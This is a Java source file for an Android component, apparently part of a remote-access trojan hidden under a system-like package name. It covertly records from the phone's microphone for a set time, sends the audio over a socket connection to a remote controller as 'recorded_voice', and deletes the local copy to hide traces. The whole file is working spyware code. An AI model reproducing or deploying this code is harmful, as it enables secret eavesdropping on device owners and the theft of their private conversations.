package com.android.background.services.managers;

import android.media.MediaRecorder;
import android.util.Log;

import com.android.background.services.socket.IOSocket;
import com.android.background.services.services.MainService;

import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.util.Timer;
import java.util.TimerTask;

public class MicManager {

    private static final String TAG = "MicManager";
    private static MediaRecorder recorder;
    private static File audioFile;

    public static void startRecording(int durationInSeconds) {
        // Initialize and create the temporary audio file
        try {
            audioFile = createTempAudioFile();
            if (audioFile == null) {
                Log.e(TAG, "Failed to create temporary audio file");
                return;
            }

            // Set up and start the MediaRecorder
            initializeMediaRecorder(audioFile);
            recorder.start();

            // Schedule the stopping of the recorder after the specified duration
            new Timer().schedule(new TimerTask() {
                @Override
                public void run() {
                    stopRecordingAndSendFile();
                }
            }, durationInSeconds * 1000L);

        } catch (Exception e) {
            Log.e(TAG, "Error during recording setup", e);
            releaseRecorder(); // Ensure the recorder is released in case of an error
        }
    }

    private static File createTempAudioFile() {
        try {
            File cacheDir = MainService.getContextOfApplication().getCacheDir();
            return File.createTempFile("sound", ".mp3", cacheDir);
        } catch (IOException e) {
            Log.e(TAG, "Failed to create temporary audio file", e);
            return null;
        }
    }

    private static void initializeMediaRecorder(File outputFile) throws IOException {
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        recorder.setOutputFile(outputFile.getAbsolutePath());
        recorder.prepare();
    }

    private static void stopRecordingAndSendFile() {
        try {
            if (recorder != null) {
                recorder.stop();
                sendVoice(audioFile);
            }
        } catch (RuntimeException e) {
            Log.e(TAG, "Error stopping MediaRecorder", e);
        } finally {
            releaseRecorder();
            deleteTempFile();
        }
    }

    private static void sendVoice(File file) {
        new Thread(() -> {
            try {
                byte[] data = readFileToByteArray(file);
                if (data != null) {
                    JSONObject object = new JSONObject();
                    object.put("file", true);
                    object.put("name", file.getName());
                    object.put("buffer", data);
                    IOSocket.getInstance().getIoSocket().emit("recorded_voice", object);
                }
            } catch (Exception e) {
                Log.e(TAG, "Error sending voice file", e);
            }
        }).start();
    }

    private static byte[] readFileToByteArray(File file) {
        try (BufferedInputStream buf = new BufferedInputStream(Files.newInputStream(file.toPath()))) {
            byte[] data = new byte[(int) file.length()];
            buf.read(data, 0, data.length);
            return data;
        } catch (IOException e) {
            Log.e(TAG, "Error reading file to byte array", e);
            return null;
        }
    }

    private static void releaseRecorder() {
        if (recorder != null) {
            recorder.release();
            recorder = null;
        }
    }

    private static void deleteTempFile() {
        if (audioFile != null && audioFile.exists()) {
            if (!audioFile.delete()) {
                Log.w(TAG, "Failed to delete temporary audio file");
            }
            audioFile = null;
        }
    }
}
